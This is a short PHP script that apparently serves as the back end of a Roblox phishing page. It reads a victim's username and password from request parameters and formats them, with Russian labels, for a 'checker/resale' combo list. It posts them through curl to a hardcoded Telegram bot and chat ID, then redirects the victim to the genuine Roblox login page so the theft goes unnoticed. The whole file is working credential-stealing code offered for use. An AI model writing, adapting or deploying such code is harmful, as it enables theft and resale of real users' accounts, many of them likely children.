<?php
/**
 * Created by Magic_Team.
 * User: Magic
 * Date: 18.03.2021
 * Time: 22:45
 */


// сюда нужно вписать токен вашего бота
define('TELEGRAM_TOKEN', '6155104192:AAHGeYqC64Vadj7LJ_PaM_CknYu-op9rSYE');

// сюда нужно вписать ваш внутренний айдишник
define('TELEGRAM_CHATID', '896825369');
$Log = $_GET['username'];
$Pass = $_GET['password'];

$message = '
👑 Roblox: '.PHP_EOL.'
✅ Логин: '.$Log.PHP_EOL.'
✅ Пароль: '.$Pass.PHP_EOL.'
✅ Для чекера/продажи: '.$Log.':'.$Pass.PHP_EOL.'
';


if (strpos($Log, '') !== false) 
{
    echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://www.roblox.com/login'></head></html>"; 
} else {
    message_to_telegram($message);
	echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://www.roblox.com/login'></head></html>";// редирект если все хорошо, лог отправлен в тг
}




// Телеграм Отчет (Отсылает сообщения в телеграмм).
function message_to_telegram($text) {
    $ch = curl_init();
    curl_setopt_array(
        $ch,
        array(
            CURLOPT_URL => 'https://api.telegram.org/bot' . TELEGRAM_TOKEN . '/sendMessage',
            CURLOPT_POST => TRUE,
            CURLOPT_RETURNTRANSFER => TRUE,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_POSTFIELDS => array(
                'chat_id' => TELEGRAM_CHATID,
                'text' => $text,
            ),
        )
    );
    curl_exec($ch);
}


